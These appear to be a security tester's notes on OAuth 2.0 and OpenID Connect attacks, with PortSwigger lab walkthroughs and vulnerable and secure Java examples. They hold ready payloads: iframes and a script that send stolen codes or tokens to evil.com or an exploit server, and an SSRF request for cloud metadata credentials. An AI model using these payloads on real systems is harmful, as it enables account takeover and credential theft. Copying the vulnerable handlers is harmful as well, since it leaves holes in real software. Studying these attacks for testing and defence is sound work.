
tactic: Initial Access

**OAuth 2.0** is an authorization framework that lets a third-party application access a user's resources on another service  without ever seeing their password. Instead of credentials, it uses **access tokens**.

```
User → Client App → Authorization Server → issues token → Client App accesses Resource Server
```



## Key Concepts

|Term|What it means|
|---|---|
|Resource Owner|The user who owns the data|
|Client Application|The app requesting access (e.g. example.com)|
|Authorization Server|Issues tokens after user consents|
|Resource Server|Holds the user's data, accepts tokens|
|`client_id`|Public identifier for the app|
|`client_secret`|Private key known only to app + auth server|
|`redirect_uri`|Where the user lands after authorization|
|`scope`|What permissions are being requested|
|`state`|CSRF protection — random value tied to session|
|`code`|Short-lived auth code exchanged for a token|
|`access_token`|Token used to call APIs on the user's behalf|
|`id_token`|JWT with user identity info (OpenID Connect only)|

---

## Authorization Code Flow

```
1. User clicks "Login with SocialMedia" on example.com

2. example.com redirects user to auth server:
GET https://socialmedia.com/auth
  ?response_type=code
  &client_id=example_clientId
  &redirect_uri=https://example.com/callback
  &scope=readPosts
  &state=randomString123

3. User sees consent screen → approves

4. Auth server redirects back with code:
GET https://example.com/callback?code=uniqueCode123&state=randomString123

5. example.com exchanges code server-side:
POST /oauth/access_token
Host: socialmedia.com
{"client_id":"example_clientId","client_secret":"example_clientSecret",
"code":"uniqueCode123","grant_type":"authorization_code"}

6. Auth server returns access_token
7. example.com calls API using Bearer token
```

---

## OpenID Connect (OIDC)

Extension on top of OAuth that adds **authentication** (not just authorization). Introduces:

- `id_token` — a signed JWT containing user identity claims (sub, email, name)
- `openid` scope — must be included to trigger OIDC
- `/userinfo` endpoint — returns user claims using the access token
- `/.well-known/openid-configuration` — discovery endpoint listing all server URLs

---

## Injection Points

- `redirect_uri` parameter — improperly validated allows token/code theft
- `state` parameter — missing or static = CSRF on the OAuth flow
- `scope` parameter — flawed validation may allow privilege upgrade
- Dynamic client registration — `logo_uri`, `jwks_uri` etc. can trigger SSRF
- Implicit flow — tokens exposed in URL fragment, visible in browser history/logs
- `/userinfo` endpoint — may accept arbitrary scope upgrades

---

## Checklist

### Redirect URI Abuse

- [ ]  Replace `redirect_uri` with your Burp Collaborator — does it redirect?

```
	&redirect_uri=https://YOUR.BURP.COLLABORATOR
```

- [ ]  Try path traversal on the callback:

```
	&redirect_uri=https://client-app.com/oauth/callback/../../evil/path
```

- [ ]  Try appending extra hosts:

```
	https://default-host.com&@evil.net#@bar.evil.net/
```

- [ ]  Try duplicate `redirect_uri` params (param pollution):

```
	&redirect_uri=client-app.com/callback&redirect_uri=evil.net
```

- [ ]  Try `localhost` variations:

```
	localhost.evil.net
```

- [ ]  Change `response_mode` from `query` to `fragment` — may break URI validation

### State Parameter (CSRF)

- [ ]  Check if `state` is present in the auth request
- [ ]  Check if `state` is validated on callback — drop/change it, does it still work?
- [ ]  If missing → OAuth flow is CSRF-able → force victim to link attacker's account

### Scope Upgrade

- [ ]  After getting a token with limited scope, manually add extra scopes to `/userinfo`:

```
	GET /userinfo?scope=openid%20profile%20email%20admin
	Authorization: Bearer <token>
```

- [ ]  Check if auth server honours the upgraded scope without re-consent

### Implicit Flow

- [ ]  Look for `response_type=token` in the auth request — token lands in URL fragment
- [ ]  Check if the app posts the token to the server without re-validating it server-side
- [ ]  Try submitting someone else's email in the POST to `/authenticate`:

json

```json
	{"email":"victim@example.com"}
```

### Open Redirect Chaining

- [ ]  Find an open redirect anywhere on the client app
- [ ]  Chain it into `redirect_uri` to steal the code/token:

```
	&redirect_uri=https://client-app.com/oauth/callback/../post/next?path=https://evil.com
```

### SSRF via Dynamic Client Registration

- [ ]  Visit `/.well-known/openid-configuration` → find `/registration` endpoint
- [ ]  Register a client with SSRF payload in `logo_uri` or `jwks_uri`:

json

```json
	{
	    "redirect_uris": ["https://example.com"],
	    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	}
```

- [ ]  Trigger the fetch by visiting `/client/<client_id>/logo`

---

## Attack Payloads

**Force OAuth profile linking (CSRF — missing state):**

```html
<iframe src="https://vulnerable.com/oauth-linking?code=STOLEN_CODE"></iframe>
```

**Redirect URI hijack — deliver to victim:**

```html
<iframe src="https://oauth-server.net/auth
  ?client_id=APP_ID
  &redirect_uri=https://evil.com
  &response_type=code
  &scope=openid%20profile%20email">
</iframe>
```

**Open redirect + implicit flow token theft:**

```html
<script>
    if (!document.location.hash) {
        window.location = "https://oauth-server.net/auth
          ?client_id=APP_ID
          &redirect_uri=https://client-app.com/oauth-callback/../post/next?path=https://evil.com/exploit
          &response_type=token
          &nonce=123456
          &scope=openid%20profile%20email"
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

---

## White Box Testing

**Vulnerable — `redirect_uri` not validated:**

```java
@GetMapping("/oauth/callback")
public RedirectView oauthCallback(@RequestParam String code,
                                  @RequestParam String redirect_uri) {
    // ← redirect_uri taken directly from user input, no whitelist check
    String token = exchangeCode(code, redirect_uri);
    return new RedirectView(redirect_uri);
}
```

**Vulnerable — `state` not verified:**

```java
@GetMapping("/callback")
public String callback(@RequestParam String code,
                       HttpSession session) {
    // ← state param never checked against session
    String token = getToken(code);
    loginUser(token);
    return "redirect:/dashboard";
}
```

**Vulnerable — implicit flow trusts client-supplied email:**

```java
@PostMapping("/authenticate")
public ResponseEntity<?> authenticate(@RequestBody Map<String, String> body) {
    String email = body.get("email");
    // ← no token validation, trusts whatever email the client sends
    User user = userRepository.findByEmail(email);
    loginUser(user);
    return ResponseEntity.ok().build();
}
```

**Secure:**

```java
// Whitelist redirect URIs in application.properties
// oauth.allowed-redirect-uris=https://client-app.com/callback

@Value("${oauth.allowed-redirect-uris}")
private List<String> allowedRedirectUris;

// Validate redirect_uri against whitelist
private void validateRedirectUri(String uri) {
    if (!allowedRedirectUris.contains(uri)) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Invalid redirect_uri");
    }
}

// Validate state against session
private void validateState(String state, HttpSession session) {
    String expected = (String) session.getAttribute("oauth_state");
    if (expected == null || !expected.equals(state)) {
        throw new ResponseStatusException(HttpStatus.FORBIDDEN, "Invalid state");
    }
    session.removeAttribute("oauth_state");
}

// Always verify identity server-side via token — never trust client-supplied claims
private String resolveUser(String accessToken) {
    // fetch /userinfo with the token and use 'sub' claim
    return oauthClient.getUserInfo(accessToken).getSub();
}
```

---
# LABS

###  Authentication bypass via OAuth implicit flow

POST /auth
`
`{"email":"carlos@carlos-montoya.net"`

right click to request in original session

### Flawed scope validation


- it may be possible  for an attacker to "upgrade" an access token with extra permissions due to flawed Oauth service.

- attacker malicious client application initially requested access to the user's email using `openid email`

``` HTTP
POST /token Host: oauth-authorization-server.com … client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code
```

- end a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.



### Forced OAuth profile linking

whole idea is that we have in the account attach social media which is outh that does a get from the 3rd party to provide a  token that attaches the social account to a specific account 

- when we insert the credential we drop this token that is used to attach the social account to the account then we create a link that would use this code to access the attach  our social media to their account that we can access from the login social media 

``` html
<iframe src="https://0a3500c204e96dd380628ae200dc0028.web-security-academy.net/oauth-linking?code=xxhYSZilXDl4VcyAE5o4HBKzNR7snAaDjJAh7LECpql"> </iframe>

```


###  OAuth account hijacking via redirect_uri


in this attack what we basically did since there is no redirect authentication in the /auth request we conducted an attack to place our payload so that when the oauth flow finish it gets `redirected` to us with the secret code 

- check if the redirect_uri accepts arbitrary url like collab

```html 
<iframe src="https://oauth-0a4a00ca04e0e2d1d3c7d7eb029b0000.oauth-server.net/auth?client_id=pufrsuk179far9qmbg3lk&redirect_uri=https://collab.com&response_type=code&scope=openid%20profile%20email"></iframe>
```


### Stealing OAuth access tokens via an open redirect

the app is vulnrable to open redirect in the next post  
``` http
GET /post/next?path=zwz84exk5rh1qs51lm183q5wmnseg84x.oastify.com 
```

so what i did is craft the AUTH redirect Uri with this traversal of the callback to the `post/path` returning  back the token to my exploit server

```js
<script>
    if (!document.location.hash) {
        window.location = "https://oauth-0ad4008c03b817cb81b97d10027600bd.oauth-server.net/auth?client_id=ppc4b5fd5uioni6tszujq&redirect_uri=https://0a8e000b0369171d818e7fb300cb0042.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a3200e7036b171f81d97ede01fe00a0.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email"
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


then use the token retrieved in the `/me`  authorization `bearer`


### SSRF via OpenID dynamic client registration

visit the well known endpoint 

``` http
GET /.well-known/openid-configuration HTTP/2
Host: oauth-0a1f009b048de21f9209387502600002.oauth-server.net
```

as a response i set of URL , i noticed a  `/reg`  after visiting it i saw that there is  error of no redirected uris in the body 

```json 
{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```


add this `   "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"` 
then go to client  to `/client/clientid/logo`
submit secret access token 


# References
- https://www.marcobehler.com/images/guides/oauth2/oauth2_flow_v2-8c394ca4.png
- https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
- [PortSwigger OAuth Labs](https://portswigger.net/web-security/oauth)
- [HackTricks OAuth to Account Takeover](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover)
- [OAuth 2.0 Flow Diagram](https://www.marcobehler.com/images/guides/oauth2/oauth2_flow_v2-8c394ca4.png)

